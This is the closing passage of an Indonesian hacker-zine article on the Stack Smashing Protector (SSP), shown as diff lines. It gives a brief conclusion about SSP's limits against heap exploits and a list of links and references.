+ditujukan untuk mengeksploitasi heap memory tidak bisa di handle oleh
+SSP ini.
+
+--[5]-- Conclusion
+
+SSP module merupakan salah satu product security yang pada saat ini telah
+menjadi andalam utama bagi hampir semua OS yang berbasis POSIX untuk
+mencegah terjadinya exploitasi berbasis Stack Overflow. Beberapa
+keterbatasan yang ada dan bisa di exploitasi merupakan salah satu
+tantangan besar bagi pengembang module ini. Mudah-mudahan tulisan ini
+menjadi salah satu inspirasi bagi para penggiat security untuk meng-
+eksplore dan atau mengembangkan tools security lainnya.
+
+Keep hacking and stay aware!
+
+~ elz
+
+--[6]-- Link and Reference
+
+-- Link --
+
+[1]-- http://kecoak-elektronik.net/web/fezine/localstackov.txt
+[2]-- http://fxr.watson.org/fxr/source/sys/stack_protector.c?v=FREEBSD-LIBC;im=10
+[3]-- http://fxr.watson.org/fxr/source/kern/stack_protector.c
+[4]-- http://www.trl.ibm.com/projects/security/ssp/
+[5]-- http://www.phrack.org/issues.html?issue=60&id=10
+
+-- Reference --
+
+I.   http://en.wikipedia.org/wiki/Buffer_overflow_protection
+II.  http://www.advogato.org/person/argp/diary/39.html
+III. http://www.trl.ibm.com/projects/security/ssp/
+
+
+
+Sarang Kecoak
+-----------------------------------------------------------------------
+Copyleft Unreserved by Law 1995 - 2011 Kecoak Elektronik Indonesia
